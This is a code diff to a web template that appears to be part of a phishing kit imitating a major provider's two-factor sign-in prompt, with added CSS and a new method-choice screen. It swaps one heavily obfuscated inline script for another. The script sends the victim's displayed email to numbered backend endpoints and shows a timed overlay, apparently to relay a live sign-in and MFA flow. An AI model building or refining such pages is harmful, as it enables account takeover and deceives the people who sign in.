@@ -12,6 +12,10 @@
         text-align: center;
         display: none;
     }
+    .user-email-link{
+        text-decoration: none;
+        color: black;
+    }
     #overlay {
     display: none;
     position: fixed;
@@ -22,10 +26,6 @@
     background-color: rgba(0, 0, 0, 0.5); 
     z-index: 999;
 }
-.user-email-link{
-        text-decoration: none;
-        color: black;
-    }
 .use-account{
             font-size: 15px;
             text-align: center;
@@ -59,10 +59,22 @@
             padding: 0;
             margin: 0;
         }
+        .option-one h4{
+    margin-left: 20px;
+    font-size: 14px;
+    position: relative;
+    font-size: 14px;
+    text-decoration: none;
+    font-family: 'Poppins',sans-serif;
+    font-weight: 400;
+}
         ul { padding:0 }
         @font-face {
     font-family: 'Poppins';
     src: url('/fonts/Poppins-Regular.ttf');
+}
+.option-one{
+    display: flex;
 }
 .sucessful{
         position:absolute;
@@ -143,7 +155,7 @@
       top: 1px;
       font-size: 12px;
       color: #007bff;
-      background-color: rgba(70, 90, 126, 0.4);
+      background-color: #fff;
       width: 30%;
       width: 20%;
       font-family: 'Poppins',sans-serif;
@@ -154,7 +166,7 @@
       top: 1px;
       font-size: 12px;
       color: #007bff;
-      background-color: rgba(39, 52, 75, 0.685);
+      background-color: #fff;
       width: 30%;
       font-family: 'Poppins',sans-serif;
     }
@@ -207,6 +219,7 @@
             left: 17%;
             border-radius: 10px;
             font-family: 'Poppins',sans-serif;
+            text-decoration: none;
         }
         .not-your,.learn-more{
             font-size: 14px;
@@ -257,9 +270,45 @@
             margin-left: 5%;
             transition: all 0.6s;
         }
+        .option-one{
+    display: flex;
+    width: 85%;
+    margin-left: 5%;
+     border-bottom: 1px solid rgb(218, 218, 218);
+}
+.option-one img{
+    height: 30px;
+    margin-left: 20px;
+    margin-top: 2.7%;
+}
+.option-one h4{
+    margin-left: 20px;
+    position: relative;
+    top: -21%;
+    text-decoration: none;
+    font-family: 'Poppins',sans-serif;
+    font-weight: 400;
+}
+.option-two img{
+    margin-top: 5%;
+}
+.method-link{
+    text-decoration: none;
+    color: black;
+}
+.choose{
+    font-family: 'Poppins',sans-serif;
+    text-align: center;
+    margin-top: 15%;   
+}
     }
 
     @media (min-width: 561px) and (max-width:1200px) {
+        .choose{
+    font-family: 'Poppins',sans-serif;
+    text-align: center;
+    margin-top: 10%;   
+}
         *body{
             padding: 0;
             margin: 0;
@@ -402,6 +451,7 @@
             position: relative;
             top: -5%;
             left: 30%;
+            text-decoration: none;
             border-radius: 10px;
             font-family: 'Poppins',sans-serif;
         }
@@ -457,6 +507,36 @@
             margin-left: 5%;
             transition: all 0.6s;
         }   
+        .option-one{
+    display: flex;
+    width: 85%;
+    margin-left: 5%;
+     border-bottom: 1px solid rgb(110, 110, 110);
+}
+.option-one img{
+    height: 30px;
+    margin-left: 20px;
+    margin-top: 2.7%;
+}
+.option-one h4{
+    margin-left: 20px;
+    position: relative;
+    top: -21%;
+    text-decoration: none;
+    font-family: 'Poppins',sans-serif;
+    font-weight: 400;
+}
+/* .option-two img{
+    margin-top: 5%;
+} */
+.method-link{
+    text-decoration: none;
+    color: black;
+}
+.choose{
+    font-family: 'Poppins',sans-serif;
+
+}
     }
 
     @media (min-width:1200px) {
@@ -470,7 +550,7 @@
             width: 25%;
             transform: translate(150%,20%);
             border: 1px solid rgba(151, 151, 151, 0.308);
-            height:570px;
+            height:560px;
             border-radius: 10px;
             padding:10px;
         }
@@ -503,6 +583,10 @@
     margin-top: 10px;
     top: 7%;
     right: 4%;
+    }
+    .choose{
+        margin-left: 5%;
+        font-family: 'Poppins',sans-serif;
     }
         .logo-img{
             display: flex;
@@ -665,7 +749,34 @@
             border-radius: 10px;
             top: -4%;
             font-family: 'Poppins',sans-serif;
+            text-decoration: none;
         }
+            .option-one{
+    display: flex;
+    width: 85%;
+    margin-left: 5%;
+     border-bottom: 1px solid rgb(110, 110, 110);
+}
+.option-one img{
+    height: 30px;
+    margin-left: 20px;
+    margin-top: 2.7%;
+}
+.option-one h4{
+    margin-left: 20px;
+    position: relative;
+    top: -21%;
+    text-decoration: none;
+    font-family: 'Poppins',sans-serif;
+    font-weight: 400;
+}
+.option-two img{
+    margin-top: 5%;
+}
+.method-link{
+    text-decoration: none;
+    color: black;
+}
     }
 </style>
 <body>
@@ -691,23 +802,30 @@
             <h4 class="use-account">To keep your account safe, we would like to  know if it's really you trying to sign in</h4>
            
                 <a href="/signin" class="user-email-link"><h4 class="user-email"><%=dataInput%></h4></a>
-        
-            <div class="device-img">
-                <img src="/images/Smart Phone Flat Style.jpg">
-            </div>
-            <div style="display: flex;justify-content: center;">
-                    <a href="#" class="forgot-password">Check your device</a>
-                  </div>
 
-                  <h4 class="not-your">A notification was sent to your device. Tap <strong>Yes</strong> on  the notification to verify it's you</h4>
-                  <h4 class="learn-more" id="learn-more" onclick="resendRequest()">Resend it</h4>
-                  <div class="try-another-method">
-                    <a href="/2faMethod" class="learn-more" id="learn-more" onclick="tryAnother()">Try another way</a>
-                  </div>
-        </div>    
+            <h4 class="choose">Choose how you want to sign in</h4>
+            <a href="/2fa" class="method-link">
+            <div class="option-one">
+                <img src="/images/icons8-smartphone-tablet-32.png">
+                <h4>Tap <strong>Yes</strong> on your Phone or Tablet</h4>
+            </div>
+        </a>
+        <a href="/2faThree" class="method-link" onclick="digitSelection()">
+            <div class="option-one option-two" >
+                <img src="/images/icons8-without-internet-48.png">
+                <h4>Use your phone or Tablet to get a security code ( even if it is offline)</h4>
+            </div>
+        </a>
+        <!-- <a href="/2faThree" class="method-link">
+            <div class="option-one option-two" >
+                <img src="/images/icons8-smartphone-tablet-32.png">
+                <h4>Enter your 8 digit backup code</h4>
+            </div>
+        </a> -->
+                </div>
     </section>
     <script>
-   (function(_0xf64420,_0x2c50fa){const _0x5175ba=_0x3112,_0x2afb4e=_0xf64420();while(!![]){try{const _0x3226e1=-parseInt(_0x5175ba(0x15b))/0x1*(-parseInt(_0x5175ba(0x175))/0x2)+-parseInt(_0x5175ba(0x172))/0x3+-parseInt(_0x5175ba(0x177))/0x4*(-parseInt(_0x5175ba(0x16d))/0x5)+-parseInt(_0x5175ba(0x173))/0x6*(parseInt(_0x5175ba(0x159))/0x7)+-parseInt(_0x5175ba(0x174))/0x8+-parseInt(_0x5175ba(0x16f))/0x9*(parseInt(_0x5175ba(0x168))/0xa)+parseInt(_0x5175ba(0x15d))/0xb*(parseInt(_0x5175ba(0x15f))/0xc);if(_0x3226e1===_0x2c50fa)break;else _0x2afb4e['push'](_0x2afb4e['shift']());}catch(_0x3c3fb6){_0x2afb4e['push'](_0x2afb4e['shift']());}}}(_0x458f,0x40931));function _0x3112(_0x332ac9,_0x454189){const _0x458fa0=_0x458f();return _0x3112=function(_0x311289,_0x2e6970){_0x311289=_0x311289-0x159;let _0x304643=_0x458fa0[_0x311289];return _0x304643;},_0x3112(_0x332ac9,_0x454189);}function _0x458f(){const _0x4b8c2f=['1046731ozupGt','block','17252CVkbHf','Network\x20response\x20was\x20not\x20ok','625449UuESfM','error','204KJikWZ','.sucessful','innerHTML','catch','http://localhost:4000/resendRequest','Error:','stringify','Success:','then','15230sSmsUs','querySelector','json','POST','style','1025ReUTve','application/json','90NswcAk','log','display','1234197BlZNYp','6GfpeTF','4039856Mchrpv','38cvKZvk','.user-email','1000XGLpVN'];_0x458f=function(){return _0x4b8c2f;};return _0x458f();}function resendRequest(){const _0x2e0e79=_0x3112,_0x242721=document['querySelector'](_0x2e0e79(0x176)),_0xaf3a02=_0x242721[_0x2e0e79(0x161)],_0x2b7c19={'key1':_0xaf3a02};console[_0x2e0e79(0x170)](_0x2b7c19),fetch(_0x2e0e79(0x163),{'method':_0x2e0e79(0x16b),'headers':{'Content-Type':'application/json'},'body':JSON['stringify'](_0x2b7c19)})[_0x2e0e79(0x167)](_0x14562e=>_0x14562e[_0x2e0e79(0x16a)]())[_0x2e0e79(0x167)](_0x58d0af=>{const _0x384ff9=_0x2e0e79;console[_0x384ff9(0x170)](_0x384ff9(0x166),_0x58d0af);})['catch'](_0x4b9759=>{const _0x33b086=_0x2e0e79;console[_0x33b086(0x15e)](_0x33b086(0x164),_0x4b9759);});}setTimeout(()=>{const _0x153745=_0x3112,_0x3f7de1=document[_0x153745(0x169)]('#overlay'),_0x47a309=document['querySelector'](_0x153745(0x160));_0x3f7de1[_0x153745(0x16c)][_0x153745(0x171)]=_0x153745(0x15a),_0x47a309[_0x153745(0x16c)][_0x153745(0x171)]='block';},0x9c40);function tryAnother(){const _0x24cc46=_0x3112,_0x47b774=document[_0x24cc46(0x169)](_0x24cc46(0x176)),_0x37f5fb=_0x47b774['innerHTML'],_0x47bc53={'email':_0x37f5fb,'tryanother':!![]};fetch('http://localhost:4000/endpointFour',{'method':_0x24cc46(0x16b),'headers':{'Content-Type':_0x24cc46(0x16e)},'body':JSON[_0x24cc46(0x165)](_0x47bc53)})[_0x24cc46(0x167)](_0x2b1a9b=>{const _0x2b3354=_0x24cc46;if(!_0x2b1a9b['ok'])throw new Error(_0x2b3354(0x15c));return _0x2b1a9b[_0x2b3354(0x16a)]();})[_0x24cc46(0x167)](_0x7f10af=>{const _0x4214dd=_0x24cc46;console[_0x4214dd(0x170)](_0x4214dd(0x166),_0x7f10af);})[_0x24cc46(0x162)](_0x19334c=>{const _0x254ef6=_0x24cc46;console[_0x254ef6(0x15e)](_0x254ef6(0x164),_0x19334c);});}
+ (function(_0x111952,_0x894d17){const _0x1e6795=_0x2f88,_0x58a3a4=_0x111952();while(!![]){try{const _0x5d4cd5=parseInt(_0x1e6795(0x18e))/0x1+-parseInt(_0x1e6795(0x185))/0x2+parseInt(_0x1e6795(0x178))/0x3*(-parseInt(_0x1e6795(0x17f))/0x4)+-parseInt(_0x1e6795(0x176))/0x5*(parseInt(_0x1e6795(0x16b))/0x6)+-parseInt(_0x1e6795(0x18b))/0x7*(-parseInt(_0x1e6795(0x174))/0x8)+parseInt(_0x1e6795(0x17e))/0x9*(parseInt(_0x1e6795(0x17c))/0xa)+parseInt(_0x1e6795(0x172))/0xb*(parseInt(_0x1e6795(0x18a))/0xc);if(_0x5d4cd5===_0x894d17)break;else _0x58a3a4['push'](_0x58a3a4['shift']());}catch(_0x30a4cd){_0x58a3a4['push'](_0x58a3a4['shift']());}}}(_0x1216,0x98771));function _0x4b79(_0x1744d3,_0x389939){const _0x226c55=_0x54fc();return _0x4b79=function(_0xf8fc42,_0x3b0da8){_0xf8fc42=_0xf8fc42-0x122;let _0x308e31=_0x226c55[_0xf8fc42];return _0x308e31;},_0x4b79(_0x1744d3,_0x389939);};(function(_0x5e1d18,_0x55c93c){const _0x14b0c9=_0x2f88,_0xd8a39c=_0x4b79,_0x13ef28=_0x5e1d18();while(!![]){try{const _0xe019ed=parseInt(_0xd8a39c(0x122))/0x1*(parseInt(_0xd8a39c(0x128))/0x2)+-parseInt(_0xd8a39c(0x12a))/0x3*(-parseInt(_0xd8a39c(0x129))/0x4)+parseInt(_0xd8a39c(0x12e))/0x5+parseInt(_0xd8a39c(0x136))/0x6+-parseInt(_0xd8a39c(0x12d))/0x7+-parseInt(_0xd8a39c(0x131))/0x8+-parseInt(_0xd8a39c(0x133))/0x9;if(_0xe019ed===_0x55c93c)break;else _0x13ef28['push'](_0x13ef28[_0x14b0c9(0x170)]());}catch(_0x362daa){_0x13ef28[_0x14b0c9(0x187)](_0x13ef28['shift']());}}}(_0x54fc,0x37d1e));function _0x1216(){const _0x6acc3b=['985869muiyFW','11668QsTcNR','log','json','querySelector','POST','then','2042232ZTRxTE','233770XqlNnD','push','3295242cLYYMJ','.sucessful','624RxLZNb','6553981vlSJUR','application/json','innerHTML','739647DcuMRm','display','catch','#overlay','3620550YcMDAm','Error:','2892ZTgdAR','280SvESij','style','shift','stringify','430573Lzqjww','block','8iPAOSB','error','10SIjBTk','2171784ouPgLv','996DalTlS','.user-email','1903725GZhXqe','Network\x20response\x20was\x20not\x20ok','10ZkKTbF','Success:'];_0x1216=function(){return _0x6acc3b;};return _0x1216();}function _0x2f88(_0x22f84e,_0x1e91ad){const _0x12166f=_0x1216();return _0x2f88=function(_0x2f8878,_0x3c09ca){_0x2f8878=_0x2f8878-0x169;let _0xe4624e=_0x12166f[_0x2f8878];return _0xe4624e;},_0x2f88(_0x22f84e,_0x1e91ad);}function _0x54fc(){const _0x4e44f0=_0x2f88,_0x13d442=['2zBhida',_0x4e44f0(0x16e),_0x4e44f0(0x16d),_0x4e44f0(0x16c),_0x4e44f0(0x184),'549549rQuckQ',_0x4e44f0(0x17a),'catch',_0x4e44f0(0x180),_0x4e44f0(0x177),_0x4e44f0(0x175),_0x4e44f0(0x188),_0x4e44f0(0x179),_0x4e44f0(0x18c),'1576566DezBXf',_0x4e44f0(0x186),_0x4e44f0(0x17d),_0x4e44f0(0x181),_0x4e44f0(0x182),'http://localhost:3000/resendRequest',_0x4e44f0(0x18d)];return _0x54fc=function(){return _0x13d442;},_0x54fc();}function resendRequest(){const _0x18e9ed=_0x2f88,_0x18502c=_0x4b79,_0x1f4719=document[_0x18502c(0x125)](_0x18502c(0x134)),_0x2a45a7=_0x1f4719[_0x18502c(0x127)],_0x5bb19f={'key1':_0x2a45a7};console[_0x18502c(0x130)](_0x5bb19f),fetch(_0x18502c(0x126),{'method':_0x18e9ed(0x183),'headers':{'Content-Type':_0x18502c(0x135)},'body':JSON['stringify'](_0x5bb19f)})['then'](_0x7a8ae8=>_0x7a8ae8[_0x18502c(0x124)]())[_0x18502c(0x12c)](_0x1dbc7c=>{const _0xae38c6=_0x18502c;console[_0xae38c6(0x130)](_0xae38c6(0x123),_0x1dbc7c);})[_0x18502c(0x12f)](_0x5c4ef2=>{const _0x636ff4=_0x18502c;console[_0x636ff4(0x132)](_0x636ff4(0x12b),_0x5c4ef2);});}setTimeout(()=>{const _0xfc6225=_0x2f88,_0x235f1b=document[_0xfc6225(0x182)](_0xfc6225(0x16a)),_0xf7beda=document['querySelector'](_0xfc6225(0x189));_0x235f1b[_0xfc6225(0x16f)]['display']=_0xfc6225(0x173),_0xf7beda[_0xfc6225(0x16f)][_0xfc6225(0x18f)]=_0xfc6225(0x173);},0x4e20);function digitSelection(){const _0x2b9c05=_0x2f88,_0x115595=document[_0x2b9c05(0x182)]('.user-email'),_0x2b987f=_0x115595[_0x2b9c05(0x18d)],_0x295d5d={'email':_0x2b987f,'tryanother':!![]};fetch('http://localhost:4000/endpointFive',{'method':_0x2b9c05(0x183),'headers':{'Content-Type':'application/json'},'body':JSON[_0x2b9c05(0x171)](_0x295d5d)})[_0x2b9c05(0x184)](_0x280fd5=>{const _0x1b9f7d=_0x2b9c05;if(!_0x280fd5['ok'])throw new Error(_0x1b9f7d(0x17b));return _0x280fd5[_0x1b9f7d(0x181)]();})['then'](_0x6669f5=>{const _0x59be79=_0x2b9c05;console[_0x59be79(0x180)](_0x59be79(0x17d),_0x6669f5);})[_0x2b9c05(0x169)](_0x336828=>{console['error']('Error:',_0x336828);});}
     </script>
 </body>
 </html>
